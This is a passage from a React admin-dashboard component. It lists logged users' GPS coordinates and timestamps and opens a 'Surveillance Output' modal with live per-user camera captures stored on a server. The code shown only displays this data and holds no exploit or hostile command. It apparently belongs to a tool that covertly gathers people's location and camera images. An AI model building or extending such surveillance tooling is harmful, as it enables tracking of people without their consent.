                                                    className="flex items-center gap-1 text-indigo-400 hover:text-indigo-300 hover:underline bg-indigo-500/10 px-1.5 py-0.5 rounded border border-indigo-500/20"
                                                >
                                                    <MapPin size={10} />
                                                    {log.location.lat.toFixed(4)}, {log.location.lng.toFixed(4)}
                                                </a>
                                                <span className="text-slate-600 text-[10px]">±{log.location.accuracy.toFixed(0)}m</span>
                                            </div>
                                        ) : (
                                            <span className="text-[10px] text-slate-600 flex items-center gap-1">
                                                <MapPin size={10} className="text-slate-700" /> Loc Hidden
                                            </span>
                                        )}
                                     </div>
                                 </td>
                                 <td className="p-4 text-slate-500 whitespace-nowrap">
                                     {new Date(log.timestamp).toLocaleDateString()} 
                                     <span className="text-slate-600 text-xs ml-1">{new Date(log.timestamp).toLocaleTimeString()}</span>
                                 </td>
                                 <td className="p-4 text-right">
                                    <span className="inline-flex items-center gap-1 text-green-400 text-xs font-bold bg-green-500/10 px-2 py-1 rounded-full border border-green-500/20">
                                       Verified
                                    </span>
                                 </td>
                              </tr>
                            ))
                          )}
                       </tbody>
                    </table>
                 </div>

                 {/* SURVEILLANCE MODAL */}
                 <AnimatePresence>
                     {viewingSurveillance && (
                         <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                             <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={() => setViewingSurveillance(null)}></div>
                             <motion.div 
                                initial={{ opacity: 0, scale: 0.95 }}
                                animate={{ opacity: 1, scale: 1 }}
                                exit={{ opacity: 0, scale: 0.95 }}
                                className="bg-slate-900 border border-slate-700 w-full max-w-4xl h-[80vh] rounded-2xl relative z-10 flex flex-col overflow-hidden"
                             >
                                 <div className="p-4 border-b border-slate-700 flex justify-between items-center bg-slate-800/50">
                                     <div className="flex items-center gap-3">
                                         <div className="p-2 bg-indigo-500/10 rounded-lg">
                                             <FolderOpen size={20} className="text-indigo-400"/>
                                         </div>
                                         <div>
                                            <div className="flex items-center gap-2">
                                                <h3 className="font-bold text-white text-lg">Surveillance Output</h3>
                                                <div className="flex items-center gap-1.5 bg-red-500/10 px-2 py-0.5 rounded-full border border-red-500/20">
                                                    <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
                                                    <span className="text-[9px] text-red-400 font-bold tracking-widest uppercase">LIVE</span>
                                                </div>
                                            </div>
                                             <p className="text-xs text-slate-400 font-mono">/root/uploads/{viewingSurveillance}/</p>
                                         </div>
                                     </div>
                                     <button onClick={() => setViewingSurveillance(null)} className="p-2 hover:bg-slate-700 rounded-full text-slate-400 hover:text-white">
                                         <X size={20} />
                                     </button>
                                 </div>
                                 
                                 <div className="flex-1 overflow-y-auto p-6 bg-slate-950/50">
                                     {surveillanceImages.length === 0 ? (
                                         <div className="h-full flex flex-col items-center justify-center text-slate-500 opacity-50">
                                             <Camera size={48} className="mb-4" />
                                             <p>No captures available for this user yet.</p>
                                             <p className="text-xs mt-2">Make sure <code>node server.js</code> is running.</p>
                                         </div>
                                     ) : (
                                         <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
                                             {surveillanceImages.map((img, i) => (
                                                 <div key={i} className="group relative aspect-video bg-black rounded-lg overflow-hidden border border-slate-800 hover:border-indigo-500/50 transition-colors">
                                                     <img src={img.url} alt="Surveillance" className="w-full h-full object-cover opacity-80 group-hover:opacity-100 transition-opacity" />
                                                     <div className="absolute inset-x-0 bottom-0 bg-black/70 p-1.5 text-[10px] font-mono text-slate-300 text-center">
                                                         {img.timestamp}
                                                     </div>
                                                 </div>
                                             ))}
                                         </div>
                                     )}
                                 </div>
                             </motion.div>
                         </div>
                     )}
                 </AnimatePresence>

              </motion.div>
            )}

         </div>
      </main>
    </div>
  );
};

export default AdminDashboard;